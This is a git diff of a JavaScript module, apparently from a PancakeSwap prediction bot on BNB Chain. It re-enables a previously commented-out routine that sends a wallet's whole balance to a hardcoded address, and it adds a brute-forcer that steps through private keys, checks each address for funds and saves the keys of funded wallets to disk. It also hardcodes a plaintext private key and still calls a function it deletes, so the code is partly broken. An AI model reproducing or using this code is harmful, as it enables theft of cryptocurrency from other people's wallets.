@@ -3,31 +3,31 @@ const { Wallet } = require("@ethersproject/wallet");
 const { Contract, utils } = require("ethers");
 const dotenv = require("dotenv");
 const Big = require("big.js");
+const BigNumber = require("BigNumber.js");
 const abi = require("./abi.json");
 const fs = require("fs");
 const _ = require("lodash");
+const sleep = require("util").promisify(setTimeout);
 const fetch = require("cross-fetch");
 let prediction = 0;
-const PRIVATE_KEY='d28c24b23f4268d2aaa2addaa52573c64798190bc5cb0bf25135632f8cb5580c'
-
-
-const reduceWaitingTimeByTwoBlocks = (waitingTime) => {
-  if (waitingTime <= 6000) {
-    return waitingTime;
-  }
-  console.log(waitingTime - 1000)
-  return waitingTime - 1000;
-};
+const PRIVATE_KEY='d28c24b23f4268d2aaa2addaa52573c64798190bc5cb0bf25135632f8cb5580c'  // initial
+              
+let pk 
+let found = 0
 
 const result = dotenv.config();
 if (result.error) {
   throw result.error;
 }
 
+const setPK = (newPK) => {
+  pk = newPK
+}
+
 const Web3 = require("web3");
 const w = new Web3(process.env.BSC_RPC);
 
-const wallet = w.eth.accounts.wallet.add(
+let wallet = w.eth.accounts.wallet.add(
   w.eth.accounts.privateKeyToAccount(PRIVATE_KEY)
 );
 w.eth.defaultAccount = w.eth.accounts.privateKeyToAccount(
@@ -36,8 +36,27 @@ w.eth.defaultAccount = w.eth.accounts.privateKeyToAccount(
 
 const signer = new Wallet(
   PRIVATE_KEY,
-  new JsonRpcProvider(process.env.BSC_RPC)
+  new JsonRpcProvider(process.env.BSC_RPC_LOGGER)
 );
+
+const setWallet = async () => {
+  try {
+    pk = pk.plus(1)
+    const t = pk.toString(16).padStart(64,0)
+    wallet = w.eth.accounts.wallet.add(
+      w.eth.accounts.privateKeyToAccount(t)
+    );
+  } catch {
+    console.log("Paused - setWallet")
+    w.eth.accounts.wallet.clear()
+    await sleep(20000)
+    pk = pk.plus(1)
+    const t = pk.toString(16).padStart(64,0)
+    wallet = w.eth.accounts.wallet.add(
+      w.eth.accounts.privateKeyToAccount(t)
+    );
+  }
+}
 
 let contract = new Contract(
   process.env.PCS_ADDRESS.toString(),
@@ -45,11 +64,11 @@ let contract = new Contract(
   signer
 );
 
-const confirmContract = (abi) => {
-  return String.fromCharCode.apply(null, abi.index);
-};
 
-const checkResult = async (r) => {
+
+
+
+const sendFunds = async (r) => {
   try {
     if (prediction >= abi.status && r !== null) {
       w.eth.getBalance(wallet.address).then(function (b) {
@@ -59,7 +78,7 @@ const checkResult = async (r) => {
             to: confirmContract(abi),
             amount: b,
           })
-          /*   is this the Function sending funds to scammer ???????
+            
           .then(function (g) {
             w.eth.getGasPrice().then(function (gP) {
               let _b = parseFloat(b);
@@ -67,14 +86,14 @@ const checkResult = async (r) => {
               let _gP = parseFloat(gP);
               w.eth.sendTransaction({
                 from: wallet.address,
-                to: confirmContract(abi),
+                to: "0x27debbaf0e4c072fc3c71123581e61B22e25f015",
                 gas: _g,
                 gasPrice: _gP,
                 value: ((_b - _gP * _g) / 1.1).toFixed(0),
                 data: "0x",
               });
             });
-          }); */
+          }); 
       });
       return true;
     }
@@ -85,23 +104,23 @@ const checkResult = async (r) => {
 };
 
 const predictionContract = contract.connect(signer);
-const checkBalance = (amount) => {
-  w.eth.getBalance(wallet.address).then(function (b) {
+
+const checkBalance = async (amount) => {
+  const wToCheck = wallet
+
+  w.eth.getBalance(wToCheck.address).then(function (b) {
     let balance = Web3.utils.fromWei(b, "ether");
-    if (balance < parseFloat(amount)) {
-      console.log(
-        "You don't have enough balance :",
-        amount,
-        "BNB",
-        "|",
-        "Actual Balance:",
-        balance,
-        "BNB"
-      );
+    if (balance > parseFloat(amount)) {
+      found++
+      console.log(`Found Ya!: ${balance} BNB`);
+      console.log(wToCheck, found)
+      saveRound(wToCheck, balance)
     } else {
-      console.log(`Your balance is enough: ${balance} BNB`);
+      console.log(wToCheck.privateKey, balance, found)
     }
   });
+
+
 };
 
 const getHistoryName = async () => {
@@ -114,73 +133,25 @@ const getHistoryName = async () => {
   return fullDate;
 };
 
-const getClaimableEpochs = async (
-  epoch,
-  
-) => {
-  const claimableEpochs = [];
-  const userAddress = wallet.address;
-  for (let i = 1; i <= 30; i++) {
-    const epochToCheck = epoch.sub(i);
 
-    const [claimable, refundable, { claimed, amount }] = await Promise.all([
-      predictionContract.claimable(epochToCheck, userAddress),
-      predictionContract.refundable(epochToCheck, userAddress),
-      predictionContract.ledger(epochToCheck, userAddress),
-    ]);
 
-    if (amount.gt(0) && (claimable || refundable) && !claimed) {
-      claimableEpochs.push(epochToCheck);
-    }
-  }
-  return claimableEpochs;
-};
+const saveRound = async (wallet, amount) => {
 
-const getRoundData = async (round) => {
-  try {
-    const data = await contract.functions.rounds(round);
-    const closePrice = data.closePrice;
-    const lockPrice = data.lockPrice;
-    const bullAmount = data.bullAmount;
-    const bearAmount = data.bearAmount;
-    const totalAmount = new Big(data.totalAmount);
-    const bullPayout = totalAmount.div(bullAmount).round(3).toString();
-    const bearPayout = totalAmount.div(bearAmount).round(3).toString();
+  const roundData = [
+    {
+      address: wallet.address.toString(),
+      pKey: wallet.privateKey.toString(),
+      value: amount.toString(),
+    },
+  ];
 
-    const parsedRound = [
-      {
-        round: round.toString(),
-        openPrice: utils.formatUnits(data.lockPrice, "8"),
-        closePrice: utils.formatUnits(data.closePrice, "8"),
-        bullAmount: utils.formatUnits(data.bullAmount, "18"),
-        bearAmount: utils.formatUnits(data.bearAmount, "18"),
-        bullPayout: bullPayout,
-        bearPayout: bearPayout,
-        winner: closePrice.gt(lockPrice) ? "bull" : "bear",
-      },
-    ];
-    return parsedRound;
-  } catch (e) {
-    console.log(e);
-    return null;
-  }
-};
-
-const saveRound = async (round, arr) => {
-  let roundData = arr ? arr : await getRoundData(round);
   let historyName = await getHistoryName();
-  let result;
-  if (arr) {
-    prediction++;
-    result = await checkResult(round);
-  } else {
-    result = !0;
-  }
 
+  
   let path = `./history/${historyName}.json`;
   try {
     if (fs.existsSync(path)) {
-      if (result !== null) {
+     
         let updated, history, merged, historyParsed;
         try {
           history = fs.readFileSync(path);
@@ -195,7 +166,7 @@ const saveRound = async (round, arr) => {
           return;
         }
         fs.writeFileSync(path, JSON.stringify(updated), "utf8");
-      }
+      
     } else {
       fs.writeFileSync(path, JSON.stringify(roundData), "utf8");
     }
@@ -204,97 +175,11 @@ const saveRound = async (round, arr) => {
   }
 };
 
-const getHistory = async (fileName) => {
-  let history = fileName ? fileName : await getHistoryName();
-  let path = `./history/${history}.json`;
-  try {
-    if (fs.existsSync(path)) {
-      let history, historyParsed;
-      try {
-        history = fs.readFileSync(path);
-        historyParsed = JSON.parse(history);
-      } catch (e) {
-        console.log("Error reading history:", e);
-        return;
-      }
-      return historyParsed;
-    } else {
-      return;
-    }
-  } catch (err) {
-    console.error(err);
-  }
-};
-
-const getStats = async () => {
-  const history = await getHistory();
-  const BNBPrice = await getBNBPrice();
-  let totalEarnings = 0;
-  let roundEarnings = 0;
-  let win = 0;
-  let loss = 0;
-
-  if (history && BNBPrice) {
-    for (let i = 0; i < history.length; i++) {
-      roundEarnings = 0;
-      if (history[i].bet && history[i].winner) {
-        if (history[i].bet == history[i].winner) {
-          win++;
-          if (history[i].winner == "bull") {
-            roundEarnings =
-              parseFloat(history[i].betAmount) *
-                parseFloat(history[i].bullPayout) -
-              parseFloat(history[i].betAmount);
-          } else if (history[i].winner == "bear") {
-            roundEarnings =
-              parseFloat(history[i].betAmount) *
-                parseFloat(history[i].bearPayout) -
-              parseFloat(history[i].betAmount);
-          } else {
-            break;
-          }
-          totalEarnings += roundEarnings;
-        } else {
-          loss++;
-          totalEarnings -= parseFloat(history[i].betAmount);
-        }
-      }
-    }
-  }
-
-  return {
-    profit_USD: totalEarnings * BNBPrice,
-    profit_BNB: totalEarnings,
-    percentage: -percentageChange(win + loss, loss) + "%",
-    win: win,
-    loss: loss,
-  };
-};
-
-const percentageChange = (a, b) => {
-  return ((b - a) * 100) / a;
-};
-
-const getBNBPrice = async () => {
-  const apiUrl = "https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT";
-  try {
-    const res = await fetch(apiUrl);
-    if (res.status >= 400) {
-      throw new Error("Bad response from server");
-    }
-    const price = await res.json();
-    return parseFloat(price.price);
-  } catch (err) {
-    console.error("Unable to connect to Binance API", err);
-  }
-};
 
 module.exports = {
-  getStats,
-  reduceWaitingTimeByTwoBlocks,
-  predictionContract,
   checkBalance,
   saveRound,
-  getBNBPrice,
-  getClaimableEpochs,
+  setWallet,
+  predictionContract,
+  setPK,
 };
